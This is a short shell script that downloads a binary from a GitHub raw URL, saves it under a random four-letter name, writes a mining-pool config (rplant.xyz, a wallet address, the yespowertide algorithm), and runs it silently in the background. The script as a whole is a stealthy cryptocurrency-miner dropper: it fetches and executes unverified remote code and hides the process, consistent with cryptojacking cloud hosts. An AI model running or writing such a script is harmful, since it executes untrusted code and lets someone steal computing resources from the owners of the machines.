NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)

wget -q -O "${NAME}" https://raw.githubusercontent.com/DOT-SUNDA/cloudsigma/refs/heads/main/JOKO
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
cat > config.json <<END
{
  "url": "asia.rplant.xyz:7059",
  "user": "EaGKnFyMFmkcGjmMuPhjcys9v8kNeZLS3Z.CS-ASIA",
  "pass": "LAB",
  "threads": 1,
  "algo": "yespowertide"
}
END

chmod +x config.json "${NAME}"

# Run cidx in the background
nohup ./$NAME -c 'config.json' &>/dev/null &
